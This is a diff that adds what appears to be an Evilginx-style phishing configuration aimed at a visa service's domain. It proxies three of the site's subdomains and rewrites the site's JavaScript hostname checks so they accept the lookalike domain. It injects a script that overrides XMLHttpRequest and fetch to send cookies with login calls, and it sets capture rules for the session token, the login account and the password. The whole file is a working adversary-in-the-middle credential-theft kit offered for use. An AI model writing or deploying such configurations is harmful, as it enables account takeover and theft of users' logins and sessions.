@@ -1,0 +1,51 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'b', orig_sub: 'b', domain: 'visaai.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'visasapi', orig_sub: 'visasapi', domain: 'visaai.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'visasotaapi', orig_sub: 'visasotaapi', domain: 'visaai.com', session: true, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'b.visaai.com', orig_sub: 'b', domain: 'visaai.com', search: 'nn\(\)\.ip;', replace: 'nn().ip;t=t.replace("fake.com","com");a=t.split(".");i=a.slice(-2).join(".");', mimes: ['application/javascript']}
+  - {triggers_on: 'b.visaai.com', orig_sub: 'b', domain: 'visaai.com', search: 'n=location,e=n\.hostname,t="";', replace: 'n=location,e=n.hostname,t="";e=e.replace("fake.com","com");', mimes: ['application/javascript']}
+#  - {triggers_on: 'b.visaai.com', orig_sub: 'b', domain: 'visaai.com', search: '{domain}', replace: '{domain}', mimes: ['application/javascript']}
+js_inject:
+  - trigger_domains: ["b.visaai.com"]
+    trigger_paths: ["/"]
+    script: |
+      // 覆盖 XMLHttpRequest，只对指定接口带 Cookie
+      (function() {
+          const originalOpen = XMLHttpRequest.prototype.open;
+          XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
+              if (url.includes('/companyOperator/login')) {
+                  this.withCredentials = true;
+              }
+              return originalOpen.apply(this, arguments);
+          };
+      })();
+
+      // fetch 示例
+      const originalFetch = window.fetch;
+      window.fetch = function(input, init = {}) {
+          const url = typeof input === 'string' ? input : input.url;
+          if (url.includes('/companyOperator/login')) {
+              init.credentials = 'include';
+          }
+          return originalFetch(input, init);
+      };
+auth_tokens:
+  - domain: 'visasapi.visaai.com'
+    path: '/companyOperator/login'
+    name: 'sessionId'
+    search: '"sessionId":"([^"]*)"'
+    type: 'body'
+credentials:
+  username:
+    key: ''
+    search: '"loginAccount":"([^"]*)"'
+    type: 'json'
+  password:
+    key: ''
+    search: '"loginPassword":"([^"]*)"'
+    type: 'json'
+login:
+  domain: 'b.visaai.com'
+  path: '/'
